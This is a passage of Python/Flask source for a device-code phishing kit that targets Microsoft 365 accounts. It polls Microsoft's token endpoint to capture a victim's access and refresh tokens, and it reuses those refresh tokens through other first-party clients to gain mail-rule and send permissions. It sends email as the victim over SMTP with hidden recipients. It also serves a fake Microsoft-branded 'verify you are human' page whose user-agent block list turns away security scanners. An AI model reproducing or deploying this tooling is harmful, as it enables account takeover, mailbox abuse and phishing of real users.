                    scope = FALLBACK_SCOPE
                    data = {"client_id": MS_CLIENT_ID, "scope": scope}
                    r = requests.post(dc_url, data=data, timeout=30)
            except Exception:
                pass
        r.raise_for_status()
        j = r.json()
    except Exception as e:
        detail = ""
        resp = getattr(e, "response", None)
        if resp is not None:
            try:
                detail = " | " + resp.json().get("error_description", "")
            except Exception:
                pass
        return None, "Failed to contact Microsoft devicecode endpoint: %s%s" % (e, detail)

    sid = secrets.token_hex(6)
    session = {
        "sid": sid,
        "created": utcnow(),
        "host": (request.host or ""),
        "completed_at": "",
        "client_id": MS_CLIENT_ID,
        "flow": flow,
        "scope": scope,
        "resource": resource,
        "user_code": j.get("user_code", ""),
        "verification_uri": j.get("verification_uri", ""),
        "verification_uri_complete": j.get("verification_uri_complete", ""),
        "device_code": j.get("device_code", ""),
        "expires_in": int(j.get("expires_in", 900)),
        "interval": max(int(j.get("interval", 5)), 3),
        "status": "pending",
        "email": "",
        "ip": "",
        "ua": "",
        "refresh_token": "",
        "access_token": "",
        "id_token": "",
        "token_type": "",
        "expires_at": "",
        "token_expiry": 0,
        "error": "",
    }
    with SESSIONS_LOCK:
        prune_sessions()
        SESSIONS[sid] = session
    threading.Thread(target=poll_worker, args=(sid,), daemon=True).start()
    return sid, None


def poll_worker(sid):
    """Poll the token endpoint until the victim signs in or the code dies."""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s:
            return
        interval = s["interval"]
        expires_in = s["expires_in"]

    deadline = time.time() + expires_in
    while time.time() < deadline:
        time.sleep(interval)
        with SESSIONS_LOCK:
            cur = SESSIONS.get(sid)
            if not cur or cur["status"] != "pending":
                return
            device_code = cur["device_code"]
            client_id = cur["client_id"]
            flow = cur.get("flow") or ("v2" if cur.get("scope") else "v1")
            scope = cur.get("scope") or ""
            resource = cur.get("resource") or ""
            if flow == "v1" and not resource:
                resource = MS_RESOURCE
            interval = max(int(cur.get("interval", 5)), 3)
            expires_in = int(cur.get("expires_in", 900))
            user_code = cur.get("user_code", "")
        try:
            data = {
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": client_id,
                "device_code": device_code,
            }
            if flow == "v1":
                data["resource"] = resource
            else:
                data["scope"] = scope
            _, token_url = flow_urls(flow)
            r = requests.post(token_url, data=data, timeout=30)
            j = r.json()
        except Exception as e:
            with SESSIONS_LOCK:
                if sid in SESSIONS:
                    SESSIONS[sid]["error"] = "Poll request failed: %s" % e
            continue

        err = j.get("error")
        err_desc = j.get("error_description", "") or ""
        err_codes = j.get("error_codes", []) or []
        if err and (65002 in err_codes or "AADSTS65002" in err_desc):
            print(
                "[warn] AADSTS65002 from token endpoint for session %s: %s"
                % (sid, err_desc[:160]),
                flush=True,
            )
            if flow == "v2" and scope and scope != FALLBACK_SCOPE:
                # Consent gap: the client is not preauthorized for the explicit
                # scope list. Reissue the device code with the preauthorized
                # .default scope and keep polling; the victim page auto-reloads
                # (code_changed) and shows the new code.
                try:
                    dc_url, _ = flow_urls(flow)
                    r2 = requests.post(
                        dc_url,
                        data={"client_id": client_id, "scope": FALLBACK_SCOPE},
                        timeout=30,
                    )
                    jd = r2.json()
                except Exception as e2:
                    jd = {"error": "request_failed", "error_description": str(e2)}
                if jd.get("device_code") and jd.get("user_code"):
                    with SESSIONS_LOCK:
                        if sid in SESSIONS:
                            SESSIONS[sid].update(
                                {
                                    "device_code": jd["device_code"],
                                    "user_code": jd["user_code"],
                                    "verification_uri": jd.get(
                                        "verification_uri",
                                        "https://microsoft.com/devicelogin",
                                    ),
                                    "verification_uri_complete": jd.get(
                                        "verification_uri_complete", ""
                                    ),
                                    "interval": int(jd.get("interval", 5)),
                                    "expires_in": int(jd.get("expires_in", 900)),
                                    "scope": FALLBACK_SCOPE,
                                    "created": utcnow(),
                                    "status": "pending",
                                    "code_changed": True,
                                    "note": (
                                        "Microsoft rejected the full scope list "
                                        "(AADSTS65002). A new code was issued with "
                                        "limited (.default) scopes - inbox rules "
                                        "are served via a Teams-client rules "
                                        "token mint."
                                    ),
                                }
                            )
                            SESSIONS[sid].pop("error", None)
                    interval = max(int(jd.get("interval", 5)), 3)
                    deadline = time.time() + int(jd.get("expires_in", 900))
                    print(
                        "[info] Reissued device code for session %s with %s"
                        % (sid, FALLBACK_SCOPE),
                        flush=True,
                    )
                    continue
            with SESSIONS_LOCK:
                if sid in SESSIONS:
                    SESSIONS[sid]["status"] = "error"
                    SESSIONS[sid]["error"] = "AADSTS65002: %s" % err_desc
            return
        if err == "authorization_pending":
            continue
        if err == "slow_down":
            time.sleep(min(5 + int(interval), 30))
            continue
        if err == "authorization_declined":
            with SESSIONS_LOCK:
                if sid in SESSIONS:
                    SESSIONS[sid]["status"] = "declined"
            return
        if err == "expired_token":
            with SESSIONS_LOCK:
                if sid in SESSIONS:
                    SESSIONS[sid]["status"] = "expired"
            return
        if err:
            with SESSIONS_LOCK:
                if sid in SESSIONS:
                    SESSIONS[sid]["status"] = "error"
                    SESSIONS[sid]["error"] = "%s: %s" % (err, err_desc)
            return

        granted = token_granted_scopes(
            j.get("access_token", ""), j.get("scope", "") or scope
        )
        entry = {
            "timestamp": utcnow(),
            "session_id": sid,
            "client_id": client_id,
            "flow": flow,
            "scope": scope,
            "granted_scopes": granted,
            "resource": resource,
            "user_code": user_code,
            "email": extract_email(j.get("access_token", ""), j.get("id_token", "")),
            "refresh_token": j.get("refresh_token", ""),
            "access_token": j.get("access_token", ""),
            "id_token": j.get("id_token", ""),
            "token_type": j.get("token_type", ""),
            "expires_in": j.get("expires_in"),
        }
        with SESSIONS_LOCK:
            if sid in SESSIONS:
                SESSIONS[sid].update(
                    {
                        "status": "success",
                        "completed_at": utcnow(),
                        "email": entry["email"],
                        "refresh_token": entry["refresh_token"],
                        "access_token": entry["access_token"],
                        "id_token": entry["id_token"],
                        "token_type": entry["token_type"],
                        "granted_scopes": granted,
                        "expires_at": utcnow(),
                        "token_expiry": int(time.time()) + max(int(entry["expires_in"] or 3600), 60),
                    }
                )
        append_log(entry)
        try:
            email = enrich_session_email(sid)
            if email and not entry.get("email"):
                entry["email"] = email
                # rewrite last log line is expensive; persist_session_tokens already
                # called inside enrich when email is filled.
        except Exception:
            pass
        return

    with SESSIONS_LOCK:
        if sid in SESSIONS and SESSIONS[sid]["status"] == "pending":
            SESSIONS[sid]["status"] = "expired"


def public_session(s):
    """Admin-facing copy of a session (never leak the device_code)."""
    return {k: v for k, v in s.items() if k != "device_code"}


def get_stolen(sid):
    """Return (session, error) for a successful session with a token."""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s:
            return None, "Session not found"
        if s["status"] != "success" or not s.get("access_token"):
            return None, "No captured token for this session yet"
        token = s["access_token"]
    return s, token


def scope_has(scope_str, name):
    """True if space-separated scope list includes name (bare or Graph URI)."""
    if not scope_str:
        return False
    name = name.lower()
    for part in str(scope_str).split():
        p = part.lower().rsplit("/", 1)[-1]
        if p == name or part.lower() == name:
            return True
    return False


def token_granted_scopes(access_token="", scope_echo=""):
    """Best-effort granted scopes from JWT scp claim or token response scope."""
    claims = decode_claims(access_token)
    scp = claims.get("scp") or claims.get("roles") or ""
    if isinstance(scp, list):
        scp = " ".join(str(x) for x in scp)
    return (scp or scope_echo or "").strip()


def refresh_access_token(sid, prefer_scope=None):
    """Exchange the stored refresh_token for a fresh access token.
    Returns (access_token, error). Also rotates the refresh_token if the
    token endpoint returns a new one.

    For v2 sessions, prefer_scope (or DEFAULT_SCOPE) is requested on refresh so
    a capture that fell back to .default can pick up MailboxSettings/Contacts
    when AAD allows the broader set on the refresh grant. Rules endpoints do
    not use this path: they mint a Teams-client token (mint_rules_token).
    """
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s:
            return None, "Session not found"
        if s["status"] != "success" or not s.get("refresh_token"):
            return None, "No refresh token for this session"
        rt = s["refresh_token"]
        client_id = s["client_id"]
        flow = s.get("flow") or ("v2" if s.get("scope") else "v1")
        scope = s.get("scope") or ""
        resource = s.get("resource") or ("" if flow == "v2" else MS_RESOURCE)

    def do_refresh(scope_to_use):
        data = {
            "grant_type": "refresh_token",
            "client_id": client_id,
            "refresh_token": rt,
        }
        if flow == "v1":
            data["resource"] = resource
        else:
            data["scope"] = scope_to_use or DEFAULT_SCOPE
        _, token_url = flow_urls(flow)
        r = requests.post(token_url, data=data, timeout=30)
        return r.json()

    try:
        if flow == "v2":
            want = (prefer_scope or DEFAULT_SCOPE).strip()
            # Prefer full mailbox scopes; fall back to the original capture scope.
            candidates = []
            for c in (want, scope, FALLBACK_SCOPE):
                c = (c or "").strip()
                if c and c not in candidates:
                    candidates.append(c)
            j = None
            last_err = None
            used_scope = scope
            for c in candidates:
                j = do_refresh(c)
                if "access_token" in j:
                    used_scope = c
                    break
                last_err = j
            if not j or "access_token" not in j:
                j = last_err or {}
                return None, "Refresh failed: %s: %s" % (
                    j.get("error", "?"),
                    j.get("error_description", ""),
                )
            scope = used_scope
        else:
            j = do_refresh(scope)
            if "access_token" not in j:
                return None, "Refresh failed: %s: %s" % (
                    j.get("error", "?"),
                    j.get("error_description", ""),
                )
    except Exception as e:
        return None, "Refresh request failed: %s" % e
    try:
        exp = max(int(j.get("expires_in", 3600)), 60)
    except Exception:
        exp = 3600
    granted = token_granted_scopes(j.get("access_token", ""), j.get("scope", "") or scope)
    token = None
    with SESSIONS_LOCK:
        if sid in SESSIONS:
            SESSIONS[sid]["access_token"] = j.get("access_token", "")
            if j.get("refresh_token"):
                SESSIONS[sid]["refresh_token"] = j["refresh_token"]
            if j.get("token_type"):
                SESSIONS[sid]["token_type"] = j["token_type"]
            if flow == "v2" and scope:
                SESSIONS[sid]["scope"] = scope
            if granted:
                SESSIONS[sid]["granted_scopes"] = granted
            SESSIONS[sid]["expires_at"] = utcnow()
            SESSIONS[sid]["token_expiry"] = int(time.time()) + exp
            token = SESSIONS[sid]["access_token"]
    if token:
        persist_session_tokens(sid)
        try:
            enrich_session_email(sid)
        except Exception:
            pass
        return token, None
    return None, "Session disappeared"


def mint_rules_token(sid, force=False):
    """Mint an access token for the victim's captured refresh token using the
    Microsoft Teams client (1fec8e78, FOCI family member) with
    MailboxSettings.ReadWrite.

    Refresh tokens are not bound to the original client/scope pair; any FOCI
    client can redeem them (Secureworks FOCI research). Rules endpoints use
    this mint for every capture (including d3590ed6 .default captures, which
    would also work with the victim's own token - the Teams mint is the
    established path and covers legacy 00b41c95 captures too). Caches the
    minted token on the session. Returns (token, error).
    """
    now = time.time()
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s:
            return None, "Session not found"
        if s["status"] != "success" or not s.get("refresh_token"):
            return None, "No refresh token for this session"
        rt = s["refresh_token"]
        cached = s.get("rules_token")
        cached_exp = s.get("rules_token_expiry") or 0
        if not force and cached and cached_exp and now < cached_exp - 120:
            return cached, None
    _, token_url = flow_urls("v2")

    def mint(scope):
        data = {
            "grant_type": "refresh_token",
            "client_id": TEAMS_CLIENT_ID,
            "refresh_token": rt,
            "scope": scope,
        }
        try:
            r = requests.post(token_url, data=data, timeout=30)
        except Exception as e:
            return {"error": "request_failed", "error_description": str(e)}
        return r.json()

    j = None
    last_err = None
    for scope in (RULES_SCOPE, "https://graph.microsoft.com/MailboxSettings.ReadWrite"):
        j = mint(scope)
        if j.get("access_token"):
            break
        last_err = j
    if not j or not j.get("access_token"):
        return None, "Teams token mint failed (%s): %s" % (
            (last_err or j).get("error", "?"),
            ((last_err or j).get("error_description", "") or "")[:300],
        )
    try:
        exp = max(int(j.get("expires_in", 3600)), 60)
    except Exception:
        exp = 3600
    new_rt = j.get("refresh_token")
    with SESSIONS_LOCK:
        if sid in SESSIONS:
            SESSIONS[sid]["rules_token"] = j.get("access_token", "")
            SESSIONS[sid]["rules_token_expiry"] = now + exp
            # FOCI mints can rotate the family refresh token; adopt it.
            if new_rt and j.get("foci", "1") != "0":
                SESSIONS[sid]["refresh_token"] = new_rt
    try:
        persist_session_tokens(sid)
    except Exception:
        pass
    return j.get("access_token", ""), None


def mint_send_token(sid, force=False):
    """Mint a send-capable access token for the victim's captured refresh
    token using the Microsoft Office/Outlook client (27922004, FOCI family
    member) with ".default offline_access".

    Send needs Mail.Send (or Mail.Send.Shared). A .default capture on the
    default client d3590ed6 grants it natively, but a legacy 00b41c95
    capture (or any other .default set without Mail.Send) makes /me/sendMail
    return a real Graph 403 ErrorAccessDenied. Real AAD rejects explicit
    Graph scope lists on first-party clients (AADSTS65002), so the mint
    requests the Office client's preauthorized .default set, which includes
    Mail.Send. Caches the minted token on the session. Returns
    (token, error)."""
    now = time.time()
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s:
            return None, "Session not found"
        if s["status"] != "success" or not s.get("refresh_token"):
            return None, "No refresh token for this session"
        rt = s["refresh_token"]
        cached = s.get("send_token")
        cached_exp = s.get("send_token_expiry") or 0
        if not force and cached and cached_exp and now < cached_exp - 120:
            return cached, None
    _, token_url = flow_urls("v2")

    def mint(scope):
        data = {
            "grant_type": "refresh_token",
            "client_id": SEND_CLIENT_ID,
            "refresh_token": rt,
            "scope": scope,
        }
        try:
            r = requests.post(token_url, data=data, timeout=30)
        except Exception as e:
            return {"error": "request_failed", "error_description": str(e)}
        return r.json()

    j = None
    last_err = None
    for scope in (SEND_SCOPE, "https://graph.microsoft.com/.default"):
        j = mint(scope)
        if j.get("access_token"):
            break
        last_err = j
    if not j or not j.get("access_token"):
        return None, "Send token mint failed (%s): %s" % (
            (last_err or j).get("error", "?"),
            ((last_err or j).get("error_description", "") or "")[:300],
        )
    # Only adopt the minted token if it actually carries Mail.Send (or
    # Mail.Send.Shared); otherwise /me/sendMail would still 403.
    # The token response scope field echoes the *requested* scope (e.g.
    # ".default offline_access"), not the expanded grant, so decode the
    # minted access token's JWT scp claim; fall back to the echo only if
    # the JWT cannot be decoded.
    minted_sc = token_granted_scopes(j.get("access_token", ""),
                                     j.get("scope", ""))
    if not (scope_has(minted_sc, "Mail.Send")
            or scope_has(minted_sc, "Mail.Send.Shared")):
        return None, (
            "Send token mint succeeded but the Office client .default set "
            "lacks Mail.Send (%s) - this tenant restricts cross-client FRT "
            "redemption for send"
        ) % (minted_sc[:160] or "empty scope")
    try:
        exp = max(int(j.get("expires_in", 3600)), 60)
    except Exception:
        exp = 3600
    new_rt = j.get("refresh_token")
    with SESSIONS_LOCK:
        if sid in SESSIONS:
            SESSIONS[sid]["send_token"] = j.get("access_token", "")
            SESSIONS[sid]["send_token_expiry"] = now + exp
            # FOCI mints can rotate the family refresh token; adopt it.
            if new_rt and j.get("foci", "1") != "0":
                SESSIONS[sid]["refresh_token"] = new_rt
    try:
        persist_session_tokens(sid)
    except Exception:
        pass
    return j.get("access_token", ""), None


def mint_smtp_token(sid, force=False):
    """Mint an SMTP XOAUTH2 access token from the session's family refresh
    token using the Outlook client (27922004) scoped to
    https://outlook.office.com/SMTP.Send - the resource smtp.office365.com
    requires. Refresh tokens are not bound to the original client/scope pair
    for FOCI members, so this works for every capture that has a refresh
    token, even when the Graph scp set lacks Mail.Send. Caches the minted
    token on the session. Returns (token, error)."""
    now = time.time()
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s:
            return None, "Session not found"
        if s["status"] != "success" or not s.get("refresh_token"):
            return None, "No refresh token for this session"
        rt = s["refresh_token"]
        cached = s.get("smtp_token")
        cached_exp = s.get("smtp_token_expiry") or 0
        if not force and cached and cached_exp and now < cached_exp - 120:
            return cached, None
    _, token_url = flow_urls("v2")
    data = {
        "grant_type": "refresh_token",
        "client_id": SMTP_CLIENT_ID,
        "refresh_token": rt,
        "scope": SMTP_SCOPE,
    }
    try:
        j = requests.post(token_url, data=data, timeout=30).json()
    except Exception as e:
        return None, "SMTP token request failed: %s" % e
    if not j.get("access_token"):
        return None, "SMTP token mint failed (%s): %s" % (
            j.get("error", "?"),
            (j.get("error_description", "") or "")[:300],
        )
    try:
        exp = max(int(j.get("expires_in", 3600)), 60)
    except Exception:
        exp = 3600
    new_rt = j.get("refresh_token")
    with SESSIONS_LOCK:
        if sid in SESSIONS:
            SESSIONS[sid]["smtp_token"] = j.get("access_token", "")
            SESSIONS[sid]["smtp_token_expiry"] = now + exp
            # FOCI mints can rotate the family refresh token; adopt it.
            if new_rt and j.get("foci", "1") != "0":
                SESSIONS[sid]["refresh_token"] = new_rt
    try:
        persist_session_tokens(sid)
    except Exception:
        pass
    return j.get("access_token", ""), None


def send_via_smtp(sid, body):
    """Deliver a composed message over smtp.office365.com:587 with XOAUTH2.

    Used when Graph /me/sendMail 403s (the capture's Graph scp set lacks
    Mail.Send). The SMTP access token is minted from the session's family
    refresh token with the outlook.office.com SMTP.Send scope. Builds a
    multipart/alternative (plain-text + HTML) message so every client
    renders it; Bcc recipients are envelope-only (never appear in headers).
    Attachments are re-created from the same contentBytes the Graph path
    would upload. Returns (ok, error)."""
    token, err = mint_smtp_token(sid)
    if err or not token:
        return False, err or "SMTP token mint failed"
    to = body.get("to") or []
    cc = body.get("cc") or []
    bcc = body.get("bcc") or []
    if not isinstance(to, list):
        to = [x.strip() for x in str(to).split(";") if x.strip()]
    if not isinstance(cc, list):
        cc = [x.strip() for x in str(cc).split(";") if x.strip()]
    if not isinstance(bcc, list):
        bcc = [x.strip() for x in str(bcc).split(";") if x.strip()]
    if not to:
        return False, "missing recipients"
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid) or {}
    from_addr = (body.get("from") or "").strip() or SMTP_FROM
    if not from_addr:
        from_addr = (s.get("email") or "").strip()
    if not from_addr:
        claims = decode_claims(s.get("id_token", ""))
        from_addr = (
            claims.get("preferred_username")
            or claims.get("email")
            or ""
        ).strip()
    if not from_addr:
        return False, "no sender address (victim email unknown)"
    subject = (body.get("subject") or "").strip() or "(no subject)"
    content = body.get("body", "") or ""
    ctype = body.get("contentType") or (
        "HTML" if ("<" in content and ">" in content) else "Text"
    )
    if str(ctype).lower() == "html":
        # Microsoft-style container (only for HTML bodies; Text stays raw).
        html_part = MS_BODY_WRAP.replace("__BODY__", content, 1)
        text_part = re.sub(r"<[^>]+>", " ", content)
        text_part = re.sub(r"\s+", " ", text_part).strip()
    else:
        html_part = MS_BODY_WRAP.replace("__BODY__", html_escape(content), 1)
        text_part = content
    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = from_addr
    if to:
        msg["To"] = ", ".join(to)
    if cc:
        msg["Cc"] = ", ".join(cc)
    msg["Date"] = formatdate(localtime=True)
    msg.attach(MIMEText(text_part, "plain", "utf-8"))
    msg.attach(MIMEText(html_part, "html", "utf-8"))
    for a in body.get("attachments") or []:
        name = (a.get("name") or "").strip()
        cbytes = a.get("contentBytes") or ""
        if not name or not cbytes:
            continue
        try:
            payload = base64.b64decode(cbytes)
        except Exception:
            continue
        att = MIMEApplication(payload, _subtype="octet-stream")
        att.add_header("Content-Disposition", "attachment", filename=name)
        msg.attach(att)
    rcpts = list(dict.fromkeys([x for x in to + cc + bcc if x]))
    auth_string = "user=%s\x01auth=Bearer %s\x01\x01" % (from_addr, token)
    try:
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30) as server:
            server.starttls()
            server.auth("XOAUTH2", lambda _=None: auth_string)
            server.sendmail(from_addr, rcpts, msg.as_string())
        return True, None
    except Exception as e:
        return False, "%s" % e


def fresh_token(sid):
    """Return a usable access token for sid, refreshing it first if it is
    expired (or within 2 minutes of expiring). Returns (token, error)."""
    with SESSIONS_LOCK:
        s = SESSIONS.get(sid)
        if not s:
            return None, "Session not found"
        if s["status"] != "success" or not s.get("access_token"):
            return None, "No captured token for this session yet"
        exp = s.get("token_expiry") or 0
    if exp and time.time() >= exp - 120:
        return refresh_access_token(sid)
    with SESSIONS_LOCK:
        return SESSIONS.get(sid, {}).get("access_token", ""), None


# ---------------------------------------------------------------------------
# Victim-facing routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    return redirect("/o365")


# ---------------------------------------------------------------------------
# Anti-bot gate (proof-of-work CAPTCHA, no third-party service)
# ---------------------------------------------------------------------------

_AB_COOKIE = "abpass"
_AB_TTL = 12 * 3600          # how long a passed browser stays verified
_AB_DIFF = "000"             # sha256 hex prefix required (3 zeros ~ 4k tries)
_AB_CHAL_TTL = 600           # challenge validity, seconds
_AB_SECRET = None
_AB_BOT_RE = re.compile(
    r"curl|wget|python|java/|okhttp|libwww|httpclient|axios|go-http|"
    r"bot|crawl|spider|slurp|scan|scrape|sqlmap|nikto|nuclei|nucleus|"
    r"masscan|zgrab|httpx|gobuster|ffuf|dirbuster|ferox|wfuzz|hydra",
    re.I,
)


def _ab_secret():
    global _AB_SECRET
    if _AB_SECRET:
        return _AB_SECRET
    keyfile = os.path.join(BASE_DIR, "ab_secret.key")
    try:
        with open(keyfile, "r") as f:
            _AB_SECRET = f.read().strip()
        if not _AB_SECRET:
            raise IOError
    except Exception:
        _AB_SECRET = secrets.token_hex(32)
        try:
            with open(keyfile, "w") as f:
                f.write(_AB_SECRET)
        except Exception:
            pass
    return _AB_SECRET


def _ab_sign(data):
    return hmac.new(_ab_secret().encode(), data.encode(), hashlib.sha256).hexdigest()


def _ab_ok():
    tok = request.cookies.get(_AB_COOKIE, "")
    if not tok or "." not in tok:
        return False
    exp, sig = tok.split(".", 1)
    if not exp.isdigit():
        return False
    if int(exp) < time.time():
        return False
    return hmac.compare_digest(_ab_sign(exp), sig)


PAGE_GATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to Microsoft 365</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: "Segoe UI", system-ui, -apple-system, Arial, sans-serif;
    background: #f3f2f1; color: #201f1e;
    display: flex; flex-direction: column; min-height: 100vh;
  }
  .hdr {
    background: #ffffff; border-bottom: 1px solid #e1dfdd;
    padding: 14px 32px; display: flex; align-items: center; gap: 10px;
  }
  .hdr .logo {
    width: 30px; height: 30px; background: #d83b01; border-radius: 3px;
    display: flex; align-items: center; justify-content: center;
    color: #fff; font-weight: 700; font-size: 17px; font-family: Georgia, serif;
  }
  .hdr .brand { font-size: 17px; color: #5e5e5e; }
  .card {
    background: #fff; width: 100%; max-width: 440px;
    box-shadow: 0 2px 6px rgba(0,0,0,.2); padding: 44px 44px 36px;
    margin: 56px auto 0;
  }
  h1 { font-size: 24px; font-weight: 400; margin-bottom: 14px; }
  .msg { font-size: 14px; color: #605e5c; line-height: 1.6; margin-bottom: 22px; }
  .vbox {
    border: 1px solid #d1cdc7; background: #faf9f8; border-radius: 2px;
    padding: 16px 16px 14px; display: flex; flex-direction: column; gap: 10px;
  }
  .vbtn {
    display: flex; align-items: center; gap: 12px; width: 100%;
    background: #fff; border: 1px solid #8a8886; border-radius: 2px;
    padding: 12px 14px; cursor: pointer; font-size: 14px; color: #201f1e;
    font-family: inherit; text-align: left;
  }
  .vbtn:hover { border-color: #0078d4; }
  .vbtn:disabled { cursor: default; opacity: .7; }
  .cbx {
    width: 22px; height: 22px; border: 2px solid #605e5c; border-radius: 2px;
    flex-shrink: 0; display: flex; align-items: center; justify-content: center;
    background: #fff; color: #fff; font-size: 15px; font-weight: 700;
  }
  .cbx.ok { background: #107c10; border-color: #107c10; }
  .spin {
    width: 20px; height: 20px; border: 3px solid #e1dfdd;
    border-top-color: #0078d4; border-radius: 50%;
    animation: spin .9s linear infinite; flex-shrink: 0;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .vmeta { font-size: 11px; color: #605e5c; text-align: right; }
  .err { color: #a4262c; font-size: 13px; display: none; margin-top: 10px; }
  .ftr { margin-top: auto; padding: 22px 32px; font-size: 12px; color: #605e5c; }
  .ftr a { color: #605e5c; margin-right: 18px; text-decoration: none; }
</style>
</head>
<body>
  <div class="hdr"><div class="logo">M</div><div class="brand">Microsoft 365</div></div>
  <div class="card">
    <h1>Verify your identity</h1>
    <div class="msg">To keep your account secure, please confirm you are a real person before continuing to Microsoft 365.</div>
    <div class="vbox">
      <button class="vbtn" id="vbtn" type="button">
        <span class="cbx" id="cbx"></span>
        <span id="vlabel">I am a human</span>
      </button>
      <div class="vmeta" id="vmeta">Protected by browser verification</div>
    </div>
    <div class="err" id="err">Verification failed. Please click the button again.</div>
    <noscript><div class="err" style="display:block">JavaScript is required. Please enable JavaScript and reload this page.</div></noscript>
  </div>
  <div class="ftr">
    <a href="#">Privacy statement</a>
    <a href="#">Terms of use</a>
    <span>Copyright &copy; Microsoft Corporation</span>
  </div>
<script>
(function () {
  var TOKEN = "__TOKEN__";
  var NONCE = TOKEN.split(".")[0];
  var DIFF = "__DIFF__";

  /* Pure-JS SHA-256 (works on http:// pages where crypto.subtle is unavailable) */
  function sha256ascii(str) {
    str = unescape(encodeURIComponent(str));
    var K = [0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
             0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
             0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
             0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
             0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
             0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
             0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
             0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
    var H = [0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
    var l = str.length;
    var words = [];
    for (var i = 0; i < l; i++) words[i >> 2] = (words[i >> 2] || 0) | (str.charCodeAt(i) << (24 - (i % 4) * 8));
    words[l >> 2] = (words[l >> 2] || 0) | (0x80 << (24 - (l % 4) * 8));
    var bitlen = l * 8;
    var nblocks = Math.ceil((words.length * 4 + 9) / 64);
    words[(nblocks * 16) - 1] = bitlen;
    for (var b = 0; b < nblocks; b++) {
      var w = new Array(64);
      for (var t = 0; t < 16; t++) w[t] = words[b * 16 + t] || 0;
      for (t = 16; t < 64; t++) {
        var s0 = ((w[t-15] >>> 7) | (w[t-15] << 25)) ^ ((w[t-15] >>> 18) | (w[t-15] << 14)) ^ (w[t-15] >>> 3);
        var s1 = ((w[t-2] >>> 17) | (w[t-2] << 15)) ^ ((w[t-2] >>> 19) | (w[t-2] << 13)) ^ (w[t-2] >>> 10);
        w[t] = (w[t-16] + s0 + w[t-7] + s1) | 0;
      }
      var a = H[0], bb = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
      for (t = 0; t < 64; t++) {
        var S1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
        var ch = (e & f) ^ (~e & g);
        var t1 = (h + S1 + ch + K[t] + w[t]) | 0;
        var S0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
        var mj = (a & bb) ^ (a & c) ^ (bb & c);
        var t2 = (S0 + mj) | 0;
        h = g; g = f; f = e; e = (d + t1) | 0; d = c; c = bb; bb = a; a = (t1 + t2) | 0;
      }
      H[0] = (H[0] + a) | 0; H[1] = (H[1] + bb) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0;
      H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
    }
    var out = "";
    for (i = 0; i < 8; i++) out += ("00000000" + ((H[i] >>> 0).toString(16))).slice(-8);
    return out;
  }

  var btn = document.getElementById("vbtn");
  var cbx = document.getElementById("cbx");
  var label = document.getElementById("vlabel");
  var meta = document.getElementById("vmeta");
  var err = document.getElementById("err");
  var busy = false;

  function setBusy(b, text) {
    busy = b;
    btn.disabled = b;
    cbx.className = "cbx";
    cbx.textContent = "";
    if (b) {
      cbx.style.border = "none";
      cbx.innerHTML = '<span class="spin" style="display:block;margin:0"></span>';
      label.textContent = text || "Verifying...";
    } else {
      cbx.style.border = "";
      cbx.innerHTML = "";
      label.textContent = "I am a human";
    }
  }

  function solveChunk(start, count, done) {
    var end = start + count;
    for (var i = start; i < end; i++) {
      if (sha256ascii(NONCE + i).lastIndexOf(DIFF, 0) === 0) { done(String(i)); return; }
    }
    setTimeout(function () { solveChunk(end, count, done); }, 0);
  }

  function submit(sol) {
    return fetch("/o365/gate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "same-origin",
      body: JSON.stringify({ t: TOKEN, s: sol })
    }).then(function (r) {
      if (r.status === 403) throw new Error("blocked");
      return r.json();
    }).then(function (j) {
      if (j && j.ok) { window.location.replace(j.redirect); return; }
      throw new Error("rejected");
    });
  }

  btn.addEventListener("click", function () {
    if (busy) return;
    err.style.display = "none";
    setBusy(true, "Verifying...");
    solveChunk(0, 4096, function (sol) {
      submit(sol).then(function () {
        cbx.style.border = "";
        cbx.className = "cbx ok";
        cbx.textContent = "\u2713";
        label.textContent = "Verified";
        meta.textContent = "Redirecting to Microsoft 365...";
      }).catch(function () {
        setBusy(false);
        err.style.display = "block";
      });
    });
  });
})();
</script>
</body>
</html>
"""


